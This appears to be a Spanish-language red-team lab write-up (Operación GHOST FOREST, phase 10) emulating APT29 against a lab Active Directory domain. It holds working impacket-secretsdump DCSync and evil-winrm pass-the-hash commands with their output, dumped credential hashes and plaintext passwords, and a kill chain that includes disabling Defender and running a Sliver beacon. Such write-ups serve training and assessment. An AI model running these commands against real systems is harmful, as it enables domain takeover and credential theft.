# Objective Completion — Operación GHOST FOREST
## Fase 10 — DCSync + Pass-the-Hash → Administrador
**Operación:** GHOST FOREST | **Adversario:** APT29 | **Framework:** MITRE ATT&CK v14  
**Operador:** Adrián Camacho | **Fecha:** 13/05/2026  
**Objetivo:** Shell interactiva como Administrador en DC-01

---

## Contexto táctico

La Fase 10 representa la culminación de la operación. Con acceso como Domain Admin via `backup_svc`, se ejecuta DCSync para volcar el hash NTLM del `Administrador` built-in (RID 500) y se usa Pass-the-Hash para obtener acceso interactivo completo al DC como la cuenta de mayor privilegio del dominio.

APT29 utiliza DCSync como técnica final de recolección de credenciales — permite obtener los hashes NTLM de todas las cuentas del dominio sin necesidad de acceso físico al DC ni de ejecutar código en él, simplemente replicando los cambios del directorio como haría un Domain Controller legítimo.

---

## 10.1 — DCSync: Volcado de hash del Administrador
**Técnica MITRE:** T1003.006 — OS Credential Dumping: DCSync  
> 📸 Captura: ![fase10-01](../screenshots/FASE-10-Objective-Completion/fase10-01-dcsync-administrator-hash.png)

```bash
impacket-secretsdump atackcorp.local/backup_svc:'Backup2024!'@10.0.2.10 \
  -just-dc-user Administrador \
  -just-dc-ntlm \
  -dc-ip 10.0.2.10
```

**Resultado:**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrador:500:aad3b435b51404eeaad3b435b51404ee:b73fdfe10e87b4ca5c0d957f81de6863:::
[*] Cleaning up...
```

**Hash obtenido:**

| Campo | Valor |
|-------|-------|
| Usuario | Administrador |
| RID | 500 (built-in Administrator) |
| LM Hash | `aad3b435b51404eeaad3b435b51404ee` (vacío) |
| **NT Hash** | **`b73fdfe10e87b4ca5c0d957f81de6863`** |

**Nota:** El LM hash `aad3b435b51404eeaad3b435b51404ee` es el hash vacío estándar — LM está deshabilitado en Windows Server 2022. Solo el NT hash es necesario para Pass-the-Hash.

---

## 10.2 — Pass-the-Hash: Acceso como Administrador
**Técnica MITRE:** T1550.002 — Use Alternate Authentication Material: Pass the Hash  
> 📸 Captura: ![fase10-02](../screenshots/FASE-10-Objective-Completion/fase10-02-administrator-shell-pth.png)

```bash
evil-winrm -i 10.0.2.10 \
  -u Administrador \
  -H b73fdfe10e87b4ca5c0d957f81de6863
```

**Resultado:**
```
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrador.DC-01\Documents>
```

**Verificación de identidad:**
```powershell
whoami
# atackcorp\administrador

hostname
# DC-01
```

**Grupos del Administrador confirmados:**

| Grupo | SID | Relevancia |
|-------|-----|-----------|
| BUILTIN\Administradores | S-1-5-32-544 | Admin local DC ✅ |
| ATACKCORP\Admins. del dominio | S-1-5-21-...-512 | Domain Admin ✅ |
| ATACKCORP\Administradores de empresas | S-1-5-21-...-519 | Enterprise Admin ✅ |
| ATACKCORP\Administradores de esquema | S-1-5-21-...-518 | Schema Admin ✅ |
| ATACKCORP\Propietarios del creador de GPO | S-1-5-21-...-520 | GPO control ✅ |
| Etiqueta obligatoria\Nivel obligatorio alto | S-1-16-12288 | High integrity ✅ |

**Acceso completo confirmado:**
- Domain Admin ✅
- Enterprise Admin ✅
- Schema Admin ✅
- Admin local en DC-01 ✅

---

## 10.3 — Resumen de credenciales comprometidas

```
CREDENCIALES OBTENIDAS — Operación GHOST FOREST
════════════════════════════════════════════════════════

VIA AS-REP ROASTING (Fase 2):
  ceo.martinez   :  Direccion2024!
  backup_svc     :  Backup2024!

VIA KERBEROASTING (Fase 5):
  backup_svc     :  Backup2024!  (confirmación)

VIA DCSYNC (Fases 9-10):
  krbtgt         :  d5237a2e43cb315c90679e2a5dae34ad  (NT)
  krbtgt         :  2f123c9bb0d3fadaa6b09592d0a5be11...  (AES256)
  Administrador  :  b73fdfe10e87b4ca5c0d957f81de6863  (NT)
```

---

## 10.4 — Kill Chain completa — GHOST FOREST

```
OPERACIÓN GHOST FOREST — Kill Chain APT29
════════════════════════════════════════════════════════

FASE 1  TA0043  Reconnaissance
        T1046   Network Service Discovery (Nmap)
        T1135   SMB Enumeration (smbclient, CME)
        T1087   LDAP Enumeration (ldapsearch)
        RESULTADO: Dominio atackcorp.local mapeado ✅

FASE 2  TA0006  Credential Access
        T1558.004  AS-REP Roasting (GetNPUsers)
        T1110.002  Password Cracking (John + wordlist OSINT)
        RESULTADO: ceo.martinez + backup_svc comprometidos ✅

FASE 3  TA0002  Execution
        T1021.006  WinRM (Evil-WinRM)
        T1078.002  Valid Domain Accounts
        RESULTADO: Shell en DC-01 como ceo.martinez ✅

FASE 4  TA0007  Discovery
        T1082   System Information Discovery
        T1087.002  Domain Account Discovery
        T1069.002  Domain Group Discovery
        T1018   Remote System Discovery
        T1558.003  SPN Enumeration
        RESULTADO: 3 attack paths a DA identificados ✅

FASE 5  TA0006  Credential Access (Ampliada)
        T1558.003  Kerberoasting (GetUserSPNs)
        T1110.002  Password Cracking (John)
        T1078.002  Valid Domain Accounts (backup_svc DA)
        RESULTADO: Domain Admin obtenido ✅

FASE 6  TA0008  Lateral Movement
        T1046   Network Service Discovery (Nmap WKSTN-01)
        T1021.006  WinRM hacia WKSTN-01
        RESULTADO: Shell en WKSTN-01 como DA ✅

FASE 7  TA0011  Command and Control
        T1071.001  C2 via HTTPS (Sliver)
        T1573.002  Encrypted Channel
        T1587.001  Beacon generado con obfuscación
        T1204   Ejecución via Start-Process Hidden
        RESULTADO: Beacon EASY_PROFIT activo en WKSTN-01 ✅

FASE 8  TA0004  Privilege Escalation
        T1562.001  Tamper Protection + Defender deshabilitados
        T1134.001  Token Impersonation (SweetPotato) — FALLIDO
        RESULTADO: SYSTEM no obtenido (limitación WinRM/Win11) ⚠️

FASE 9  TA0003  Persistence
        T1003.006  DCSync krbtgt hash
        T1558.001  Golden Ticket forjado — RECHAZADO por DC
        RESULTADO: PAC Validation bloquea ticket ⚠️

FASE 10 TA0006  Credential Access + TA0009 Collection
        T1003.006  DCSync Administrador hash
        T1550.002  Pass-the-Hash
        RESULTADO: Shell como Administrador en DC-01 ✅

════════════════════════════════════════════════════════
OBJETIVO PRIMARIO:   Domain Admin sobre atackcorp.local ✅
OBJETIVO SECUNDARIO: Hash Administrador + shell interactiva ✅
DOMINIO COMPROMETIDO: atackcorp.local ✅
════════════════════════════════════════════════════════
```

---

## 10.5 — Superficie comprometida final

```
ACTIVOS COMPROMETIDOS
════════════════════════════════════════════════════════

DC-01 (10.0.2.10) — Windows Server 2022
  Shell como Administrador (RID 500) ✅
  Hash NTLM Administrador obtenido ✅
  Hash NTLM krbtgt obtenido ✅
  Acceso total al dominio ✅

WKSTN-01 (10.0.2.8) — Windows 11
  Shell como backup_svc (DA) ✅
  Beacon Sliver EASY_PROFIT activo ✅
  Defender deshabilitado ✅
  Tamper Protection desactivada ✅

DOMINIO atackcorp.local
  Todos los hashes NTLM del dominio accesibles via DCSync ✅
  Estructura AD completamente enumerada ✅
  10 usuarios de dominio identificados ✅
```

---

## Resumen ejecutivo

La **Operación GHOST FOREST** ha comprometido completamente el dominio `atackcorp.local` siguiendo la cadena de ataque característica de APT29. Partiendo de un escaneo de red sin credenciales, se escaló progresivamente hasta obtener acceso como `Administrador` built-in en el Domain Controller mediante una combinación de AS-REP Roasting, Kerberoasting, movimiento lateral via WinRM y DCSync con Pass-the-Hash.

Los objetivos primario y secundario han sido alcanzados. Las únicas técnicas que no funcionaron como se esperaba fueron la escalada a SYSTEM via Potato attacks (limitación arquitectural de WinRM en Windows 11) y el Golden Ticket (PAC Validation reforzada en Windows Server 2022) — ambas documentadas con análisis técnico detallado y decisiones tácticas justificadas.

---

**Documentación completa:** Ver [docs/](.) para todos los logs de la operación.